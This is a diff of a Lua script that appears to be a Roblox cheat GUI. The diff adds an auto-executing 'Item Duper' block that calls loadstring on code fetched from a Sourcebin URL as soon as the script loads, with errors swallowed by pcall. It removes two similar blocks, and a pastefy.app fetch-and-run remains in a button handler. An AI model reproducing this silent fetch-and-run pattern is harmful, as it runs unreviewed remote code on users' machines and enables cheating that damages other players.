@@ -26,6 +26,13 @@ gradient.Color = ColorSequence.new{
 }
 gradient.Rotation = 90
 
+-- AUTO EXECUTE Item Duper (Sourcebin)
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://cdn.sourceb.in/bins/PYrVdKo7a2/0"))()
+    end)
+end)
+
 -- AUTO EXECUTE (UPDATED)
 task.spawn(function()
     pcall(function()
@@ -33,12 +40,6 @@ task.spawn(function()
     end)
 end)
 
--- AUTO EXECUTE ZL HUB
-task.spawn(function()
-    pcall(function()
-        loadstring(game:HttpGet("https://cdn.sourceb.in/bins/FcY8Rd64ZQ/0"))()
-    end)
-end)
 
 local title = Instance.new("TextLabel")
 title.Size = UDim2.new(1, 0, 0, 50)
@@ -265,12 +266,6 @@ newBtn.MouseButton1Click:Connect(function()
     task.spawn(function()
         pcall(function()
             loadstring(game:HttpGet("https://pastefy.app/Cpx1Uzw7/raw"))()
-        end)
-    end)
-
-    task.spawn(function()
-        pcall(function()
-            loadstring(game:HttpGet("https://cdn.sourceb.in/bins/RXsKoGqRKL/0"))()
         end)
     end)
 
